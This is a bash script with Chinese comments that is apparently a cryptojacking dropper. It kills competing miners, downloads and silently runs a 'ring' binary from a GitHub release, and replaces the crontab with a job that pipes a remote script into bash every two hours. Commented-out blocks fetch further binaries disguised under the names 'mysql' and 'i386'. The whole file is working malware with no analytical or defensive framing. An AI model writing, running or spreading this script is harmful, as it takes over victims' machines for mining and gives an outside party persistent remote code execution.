#!/bin/bash
#停止c3池
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/uninstall_c3pool_miner.sh | bash -s
# 首先终止匹配的进程
pkill -9 -f 'xmrig'
pkill -9 -f './mysql'
pkill -9 -f './i386'
pkill -9 -f './ABpdKw4o'
# 检查/mnt/ring目录是否存在，如果不存在则执行
if [ ! -d "/mnt/ring" ]; then
  cd /mnt
  wget https://github.com/mumu1667/trx20/releases/download/fuck/ring.tar
  tar -xvf /mnt/ring.tar
  rm -rf /mnt/ring.tar
  chmod +x /mnt/ring/ring
fi

# 检查 ./mnt/ring/ring 是否正在运行，如果没有运行则启动新的进程并将其放入后台运行，同时将标准输出和错误输出重定向到/dev/null
if pgrep -f "./mnt/ring/ring" >/dev/null; then
    echo "Process is running, skipping."
else
    echo "Process is not running, starting..."
    /mnt/ring/ring -c /mnt/ring/config.json >/dev/null 2>&1 & disown
fi
# 检查/opt目录下mysql文件是否存在，如果存在则跳过，如果不存在则执行
#if [ ! -f "/opt/mysql" ]; then
#  cd /opt
#  wget -qO mysql --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/mysql
#  chmod +x mysql
#  ./mysql & disown
#fi

# 检查/opt目录下i386文件是否存在，如果存在则跳过，如果不存在则执行
#if [ ! -f "/opt/i386" ]; then
#  cd /opt
#  wget -qO i386 --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/i386
#  chmod +x i386
#  nohup ./i386 >/dev/null 2>&1 & disown
#fi
#cd /opt; ./mysql >/dev/null 2>&1 & disown
#cd /opt; ./i386 >/dev/null 2>&1 & disown
#清除上一次的任务，添加下一次的任务
crontab -l | grep -v "curl" | crontab -
echo "0 */2 * * * curl -s -L https://raw.githubusercontent.com/mumu1667/trx20/main/vb.sh | bash" | crontab -
